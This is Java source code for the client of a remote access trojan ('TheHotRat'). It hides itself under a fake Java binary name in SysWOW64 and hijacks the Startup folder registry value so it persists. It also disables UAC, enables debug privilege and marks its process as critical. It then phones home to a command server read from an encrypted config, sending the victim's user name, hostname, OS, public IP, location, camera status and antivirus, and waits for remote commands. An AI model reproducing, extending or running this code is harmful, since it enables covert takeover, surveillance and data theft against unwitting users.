package me.client;

import com.sun.jna.platform.win32.*;
import me.client.filecopy.Copy;
import me.client.send.*;
import me.client.filecopy.JarUtil;
import me.client.utils.*;

import java.io.*;
import java.net.*;
import javax.swing.*;

import static com.sun.jna.platform.win32.WinBase.MUTEX_ALL_ACCESS;
import static com.sun.jna.platform.win32.WinDef.MAX_PATH;
import static com.sun.jna.platform.win32.WinNT.*;

public class Client {
    public static final String VERSION = "8.6";
    public static boolean isturn = false;
    public static Socket socket;
    public static InetSocketAddress inetSocketAddress;

    public static String getWindowsPath() {
        char[] chars = new char[MAX_PATH];
        LoadKernel32.instance.GetWindowsDirectoryW(chars,MAX_PATH);
        File file = new File(new String(chars).trim() + "\\SysWOW64\\WindowsSettings");
        if(!file.exists()) {
            file.mkdirs();
        }
        return file.getPath();
    }

    public static String getHead() {
        String head = "";
        String temp1 = "";
        try {
            FileInputStream fileInputStream = new FileInputStream(getWindowsPath1() + "\\WindowsConfig.ini");
            String temp = "";
            byte[] bytes = new byte[256];
            int len = 0;
            while ((len = fileInputStream.read(bytes))!=-1) {
                temp += new String(bytes,0,len);
            }
            fileInputStream.close();
            temp1 = new String(AESUtils.decrypt(temp));
            head = temp1.substring(temp1.indexOf("Head:") + 5,temp1.indexOf("password:") - 1);
        }catch (Exception e) {
            e.printStackTrace();
        }
        return head;
    }

    public static String getWindowsPath1() {
        char[] chars = new char[MAX_PATH];
        LoadKernel32.instance.GetWindowsDirectoryW(chars,MAX_PATH);
        File file = new File(new String(chars).trim() + "\\SysWOW64\\WindowsConfig");
        if(!file.exists()) {
            file.mkdirs();
        }
        return file.getPath();
    }

    public static void register(){
        File file = new File(System.getProperty("user.home") + "\\AppData\\SetUp\\360Security.ini");
        JarUtil jarUtil = new JarUtil(Client.class);
        String path = jarUtil.getJarPath() + "\\javaw.jar";
        Copy copy = new Copy(path,Client.getWindowsPath() + "\\Java(TM) Platform EE binary.jar");
        Copy copy1 = new Copy(jarUtil.getJarPath() + "\\360Security.ini",getWindowsPath1() + "\\WindowsConfig.ini");
        copy.copy();
        copy1.copy();
        Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup",getWindowsPath());
        WinDef.DWORD dword = new WinDef.DWORD(WinNT.FILE_ATTRIBUTE_HIDDEN | WinNT.FILE_ATTRIBUTE_SYSTEM | 0x00000001);
        Kernel32.INSTANCE.SetFileAttributes(getWindowsPath(),dword);
        Kernel32.INSTANCE.SetFileAttributes(getWindowsPath1(),dword);
        Kernel32.INSTANCE.SetFileAttributes(path,dword);
        file.delete();
        Advapi32Util.registrySetIntValue(WinReg.HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",0x00000000);//关闭UAC提示
    }

    public static String getIP() {
        String IP = "";
        String temp1 = "";
        try {
            FileInputStream fileInputStream = new FileInputStream(getWindowsPath1() + "\\WindowsConfig.ini");
            String temp = "";
            byte[] bytes = new byte[256];
            int len = 0;
            while ((len = fileInputStream.read(bytes))!=-1) {
                temp += new String(bytes,0,len);
            }
            fileInputStream.close();
            temp1 = new String(AESUtils.decrypt(temp));
            IP = temp1.substring(temp1.indexOf("IP:") + 3,temp1.indexOf("|"));
        }catch (Exception e) {
            e.printStackTrace();
        }
        return IP;
    }

    public static int getPort() {
        String Port = "";
        int port = 0;
        try {
            FileInputStream fileInputStream = new FileInputStream(getWindowsPath1() + "\\WindowsConfig.ini");
            String temp = "";
            String temp1 = "";
            byte[] bytes = new byte[256];
            int len = 0;
            while ((len = fileInputStream.read(bytes))!=-1) {
                temp += new String(bytes,0,len);
            }
            fileInputStream.close();
            temp1 = new String(AESUtils.decrypt(temp));
            Port = temp1.substring(temp1.indexOf("Port:") + 5,temp1.indexOf("Head:")-1);
            port = Integer.parseInt(Port);
        }catch (Exception e) {
        }
        return port;
    }
    public static void relieve(){
        //解除主机
        File file = new File(getWindowsPath1() + "\\WindowsConfig.ini");
        File file1 = new File(System.getProperty("user.home") + "\\AppData\\SetUp\\javaw.jar");
        File file2 = new File(System.getProperty("user.home") + "\\AppData\\SetUp\\360Security.ini");
        LoadNtdll.instance.RtlSetProcessIsCritical(new WinDef.BOOL(false),null,new WinDef.BOOL(false));
        Advapi32Util.registrySetExpandableStringValue(WinReg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders","Startup","wowWTF");
        Advapi32Util.registrySetIntValue(WinReg.HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System","EnableLUA",0x00000001);
        file.delete();
        file1.delete();
        file2.delete();
        System.exit(0);
    }
    public static void lock() {
        if(Kernel32.INSTANCE.OpenMutex(MUTEX_ALL_ACCESS,false,"TheHotRat") == null) {
            Kernel32.INSTANCE.CreateMutex(null,false,"TheHotRat");
        }else {
            Kernel32.INSTANCE.ExitProcess(0);
        }
    }
    public static void main(String[] args) throws Exception {
        UIManager.setLookAndFeel("com.sun.java.swing.plaf.windows.WindowsLookAndFeel");
        lock();
        register();
        enableSEDebugNamePriv();
        LoadNtdll.instance.RtlSetProcessIsCritical(new WinDef.BOOL(true),null,new WinDef.BOOL(false));
        new ShutdownChecker().start();
        inetSocketAddress = new InetSocketAddress(getIP(),getPort());
        try {
            while (!isturn) {
                con();
            }
        }catch (Exception e) {
        }
    }
    public static void enableSEDebugNamePriv() {
        WinNT.LUID luid = new WinNT.LUID();
        LUID_AND_ATTRIBUTES luid_and_attributes = new LUID_AND_ATTRIBUTES();
        WinNT.HANDLEByReference handle = new WinNT.HANDLEByReference();
        WinNT.TOKEN_PRIVILEGES token_privileges = new WinNT.TOKEN_PRIVILEGES(1);
        Advapi32.INSTANCE.OpenProcessToken(Kernel32.INSTANCE.GetCurrentProcess(),TOKEN_ALL_ACCESS,handle);
        Advapi32.INSTANCE.LookupPrivilegeValue(null,SE_DEBUG_NAME,luid);
        token_privileges.PrivilegeCount = new WinDef.DWORD(1);
        luid_and_attributes.Attributes = new DWORD(SE_PRIVILEGE_ENABLED);
        luid_and_attributes.Luid = luid;
        token_privileges.Privileges[0] = luid_and_attributes;
        Advapi32.INSTANCE.AdjustTokenPrivileges(handle.getValue(),false,token_privileges,token_privileges.size(),null,null);
    }
    public static void con() {
        try {
            socket = new Socket();
            socket.setSoLinger(true,0);
            socket.connect(inetSocketAddress);
            isturn = true;
            JarUtil jarUtil = new JarUtil(Client.class);
            String IP = GetInternetIP.getIP();
            SendMessage.send(MessageFlags.CLIENT_HEAD,getHead().getBytes("GBK"),socket);
            String info = System.getProperty("user.name")+"$"+InetAddress.getLocalHost().getHostName()+"$"+System.getProperty("os.name")+"$"+IP+"$"+GetInternetIP.getRegion(IP)+"$"+jarUtil.getJarName()+"$"+
                    SystemInfo.getCurrentPID()+"$"+SystemInfo.camera()+"$"+VERSION +"$" + GetAntivirus.get();
            SendMessage.send(MessageFlags.CLIENT_LOGIN,info.getBytes("GBK"),socket);
            new SendHeartPack(socket).start();
            new ReceiveMessage(socket).start();
        }catch (Exception e) {
            isturn = false;
        }
    }

    public static void recon() {
        while (!isturn) {
            try {
                con();
            }catch (Exception e) {
            }
        }
    }
}